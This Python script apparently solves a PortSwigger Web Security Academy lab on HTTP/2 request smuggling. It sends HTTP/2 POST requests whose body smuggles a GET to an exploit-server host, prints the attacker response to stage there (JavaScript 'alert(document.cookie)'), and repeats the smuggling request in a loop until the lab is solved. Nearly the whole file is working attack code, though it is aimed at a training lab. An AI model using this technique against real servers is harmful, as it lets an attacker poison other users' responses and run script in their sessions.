import random
import socket
import ssl
import time

import h2.connection
import h2.events
import certifi

LAB_ID = "???"
EXPLOIT_SERVER_ID = "???"


def POST_() -> str:
    method, path = 'POST', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = [
        (':method', method),
        (':path', path),
        (':authority', host),
        (':scheme', 'https'),
        ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'),
        ('accept-language', 'en-US,en;q=0.5'),
        ('content-type', 'application/x-www-form-urlencoded'),
        ('content-length', '0'),
    ]

    body = f"""GET /resources HTTP/1.1
Host: exploit-{EXPLOIT_SERVER_ID}.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1""" \
        .replace('\n', '\r\n')

    # generic socket and ssl configuration
    socket.setdefaulttimeout(15)
    ctx = ssl.create_default_context(cafile=certifi.where())
    ctx.set_alpn_protocols(['h2'])

    # open a socket to the server and initiate TLS/SSL
    s = socket.create_connection((host, port))
    s = ctx.wrap_socket(s, server_hostname=host)

    c = h2.connection.H2Connection()
    c.initiate_connection()
    s.sendall(c.data_to_send())

    c.send_headers(1, headers)
    c.send_data(1, data=body.encode('utf-8'), end_stream=True)
    s.sendall(c.data_to_send())

    response_body = b''
    response_stream_ended = False
    status = None
    while not response_stream_ended:
        # read raw data from the socket
        data = s.recv(65536 * 1024)
        if not data:
            break

        # feed raw data into h2, and process resulting events
        events = c.receive_data(data)
        for event in events:
            # print(event)
            if isinstance(event, h2.events.ResponseReceived):
                status = next(header[1] for header in event.headers if header[0] == b':status').decode()
            if isinstance(event, h2.events.DataReceived):
                # update flow control so the server doesn't starve us
                c.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                # more response body data received
                response_body += event.data
            if isinstance(event, h2.events.StreamEnded):
                # response body completed, let's exit the loop
                response_stream_ended = True
                break

    # tell the server we are closing the h2 connection
    c.close_connection()
    s.sendall(c.data_to_send())

    # close the socket
    s.close()
    return status


print("exploit:")
print(f"""/resources

HTTP/1.1 200 OK
Content-Type: text/javascript; charset=utf-8

alert(document.cookie)""")
input("set exploit and hit enter to proceed")
print("running exploit until the lab solves")
while True:
    POST_()
    time.sleep(1)
    if POST_() != '302':
        print("got a hit")
        POST_()
    s_to_sleep = random.randint(3000, 4000)/1000
    print(f"sleeping {s_to_sleep} s")
    time.sleep(s_to_sleep)
